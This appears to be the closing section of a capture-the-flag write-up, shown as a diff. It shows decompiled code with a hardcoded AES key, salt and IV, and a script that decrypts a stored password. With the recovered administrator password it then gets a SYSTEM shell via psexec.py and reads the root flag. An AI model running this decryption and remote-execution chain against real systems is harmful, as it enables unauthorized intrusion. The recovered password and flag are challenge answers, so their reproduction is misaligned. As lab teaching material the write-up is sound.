@@ -574,3 +574,106 @@ Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
 ```bash
 ilspycmd -o DecompiledOutput/ "HqkLdap.exe"
 ```
+
+```bash
+public class CR
+	{
+		private const string K = "667912";
+
+		private const string I = "1L1SA61493DRV53Z";
+
+		private const string SA = "1313Rf99";
+
+		public static string DS(string EncryptedString)
+		{
+			if (string.IsNullOrEmpty(EncryptedString))
+			{
+				return string.Empty;
+			}
+			return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
+		}
+
+		public static string ES(string PlainString)
+		{
+			if (string.IsNullOrEmpty(PlainString))
+			{
+				return string.Empty;
+			}
+			return RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
+		}
+````
+
+
+```bash
+#!/bin/bash
+
+CIPHERTEXT="$1"
+
+python3 - <<EOF
+from base64 import b64decode
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+
+passphrase = "667912"
+salt = b"1313Rf99"
+iv = b"1L1SA61493DRV53Z"
+iterations = 3
+key_size = 32  # 256 bits
+
+# Derive key
+key = PBKDF2(passphrase, salt, dkLen=key_size, count=iterations)
+
+# Decode and decrypt
+ciphertext = b64decode("$CIPHERTEXT")
+cipher = AES.new(key, AES.MODE_CBC, iv)
+decrypted = cipher.decrypt(ciphertext)
+
+# Remove PKCS7 padding
+pad_len = decrypted[-1]
+plaintext = decrypted[:-pad_len]
+
+print(plaintext.decode("ascii", errors="ignore"))
+EOF
+
+```
+```bash
+./decrypt.sh "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="
+XtH4nkS4Pl4y1nGX
+```
+
+```bash
+psexec.py administrator:XtH4nkS4Pl4y1nGX@10.129.149.154
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.149.154.....
+[*] Found writable share ADMIN$
+[*] Uploading file HkHXAQuO.exe
+[*] Opening SVCManager on 10.129.149.154.....
+[*] Creating service wXUy on 10.129.149.154.....
+[*] Starting service wXUy.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+```bash
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is E6FB-F2E9
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/21/2021  07:27 PM    <DIR>          .
+07/21/2021  07:27 PM    <DIR>          ..
+07/22/2025  08:01 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   7,534,522,368 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+af940f193b9cb3e132351aa3365f129c
+
+````
+
